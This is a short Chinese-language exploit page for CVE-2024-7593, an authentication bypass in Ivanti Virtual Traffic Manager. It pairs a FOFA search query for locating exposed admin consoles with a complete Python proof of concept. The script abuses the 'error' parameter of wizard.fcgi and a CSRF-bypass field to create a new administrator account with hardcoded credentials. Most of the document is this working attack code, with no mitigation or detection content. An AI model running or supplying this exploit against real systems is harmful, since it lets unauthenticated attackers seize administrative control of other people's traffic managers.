# Ivanti-Virtual-Traffic-Manager存在身份验证绕过漏洞(CVE-2024-7593)

Ivanti Virtual Traffic Manager (vTM)多个版本存在身份验证绕过漏洞(CVE-2024-7593)，由于身份验证算法的错误实现，导致未经身份验证的远程攻击者绕过面向互联网的vTM管理控制台上的身份验证，未授权创建管理用户。

## fofa

```javascript
"Pulse Secure vTM Administration Server"
```

## poc

```python
import requests

# Set to target address
admin_portal = 'https://1.1.1.1:9090'

# User to create
new_admin_name = 'ldwkadmin'
new_admin_password = 'ldwkadmin1234'

requests.packages.urllib3.disable_warnings() 
session = requests.Session()

# Setting 'error' bypasses access control for wizard.fcgi.
# wizard.fcgi can load any section in the web interface.
params = { 'error': 1,
          'section': 'Access Management:LocalUsers' }

# Create new user request
# _form_submitted to bypass CSRF
data = {  '_form_submitted': 'form',
          'create_user': 'Create',
          'group': 'admin',
          'newusername': new_admin_name,
          'password1': new_admin_password,
          'password2': new_admin_password }

# Post request
r = session.post(admin_portal + "/apps/zxtm/wizard.fcgi", params=params, data=data, verify=False, allow_redirects=False)

# View response
content = r.content.decode('utf-8')
print(content)

if r.status_code == 200 and '<title>2<' in content:
    print("New user request sent")
    print("Login with username '" + new_admin_name + "' and password '" + new_admin_password + "'")
else:
    print("Unable to create new user")  
```

